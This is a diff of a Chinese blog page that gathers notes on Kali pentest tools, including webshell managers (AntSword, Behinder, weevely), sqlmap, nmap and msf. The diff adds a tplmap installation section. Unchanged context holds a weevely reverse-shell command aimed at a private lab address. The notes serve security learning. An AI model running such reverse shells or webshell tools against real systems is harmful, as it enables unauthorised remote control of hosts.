@@ -28,7 +28,7 @@
 <meta property="og:description" content="蚁剑下载1https:&#x2F;&#x2F;gitee.com&#x2F;AntSwordProject&#x2F;AntSword-Loader  behinder使用下载地址 1https:&#x2F;&#x2F;github.com&#x2F;rebeyond&#x2F;Behinder&#x2F;releases  由于自己再windos下弄不好决定弄到kali上，kali没有java环境需要配置java环境 下载解压，在目录里打开终端 1java -jar Behi">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-04-03T15:48:25.000Z">
-<meta property="article:modified_time" content="2023-05-27T15:20:44.454Z">
+<meta property="article:modified_time" content="2023-06-11T11:32:30.717Z">
 <meta property="article:author" content="小zhou">
 <meta property="article:tag" content="kali">
 <meta name="twitter:card" content="summary">
@@ -224,7 +224,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-27 23:20:44" itemprop="dateModified" datetime="2023-05-27T23:20:44+08:00">2023-05-27</time>
+                <time title="修改时间：2023-06-11 19:32:30" itemprop="dateModified" datetime="2023-06-11T19:32:30+08:00">2023-06-11</time>
               </span>
 
           <br>
@@ -233,7 +233,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.7k</span>
+              <span>2.9k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -387,6 +387,15 @@
 <p> 反弹shell </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor_reversetcp 192.168.1.9 3366</span><br></pre></td></tr></table></figure>
 
+<h2 id="tplmap-下载安装"><a href="#tplmap-下载安装" class="headerlink" title="tplmap 下载安装"></a>tplmap 下载安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果安装成功即可使用</p>
+<p>若出<strong>error: subprocess-exited-with-error</strong>，这里我忘记截屏了则参考这个</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ktsm/p/15691652.html">kali 下安装tplmap - KittySmith - 博客园 (cnblogs.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 进入家目录</span><br><span class="line">cd </span><br><span class="line"></span><br><span class="line">#建立目录ins-pip2</span><br><span class="line">mkdir ins-pip2</span><br><span class="line"></span><br><span class="line">#下载pip2安装脚本</span><br><span class="line">wget  https://bootstrap.pypa.io/pip/2.6/get-pip.py</span><br><span class="line"></span><br><span class="line">#python2执行 需要sudo权限</span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">#升级pip2</span><br><span class="line">sudo pip2 install --upgrade pip </span><br><span class="line"></span><br><span class="line">#安装pip2扩展工具，不然后面安装还是报错</span><br><span class="line">sudo pip2 install --upgrade setuptools </span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -490,7 +499,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E4%B8%8B%E8%BD%BD"><span class="nav-number">1.</span> <span class="nav-text">蚁剑下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#behinder%E4%BD%BF%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">behinder使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap%E4%BD%BF%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">sqlmap使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap%E4%BD%BF%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">nmap使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dirsearch%E4%BD%BF%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">dirsearch使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf"><span class="nav-number">6.</span> <span class="nav-text">msf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">7.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash-%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">7.1.</span> <span class="nav-text">bash 反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">7.2.</span> <span class="nav-text">nc反弹shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#weevely"><span class="nav-number">8.</span> <span class="nav-text">weevely</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E4%B8%8B%E8%BD%BD"><span class="nav-number">1.</span> <span class="nav-text">蚁剑下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#behinder%E4%BD%BF%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">behinder使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap%E4%BD%BF%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">sqlmap使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap%E4%BD%BF%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">nmap使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dirsearch%E4%BD%BF%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">dirsearch使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf"><span class="nav-number">6.</span> <span class="nav-text">msf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">7.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash-%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">7.1.</span> <span class="nav-text">bash 反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">7.2.</span> <span class="nav-text">nc反弹shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#weevely"><span class="nav-number">8.</span> <span class="nav-text">weevely</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tplmap-%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85"><span class="nav-number">9.</span> <span class="nav-text">tplmap 下载安装</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -506,7 +515,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-count">42</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -519,7 +528,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">23</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -555,12 +564,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">53k</span>
+    <span title="站点总字数">57k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:15</span>
+    <span title="站点阅读时长">3:28</span>
 </div>
 
 <!--
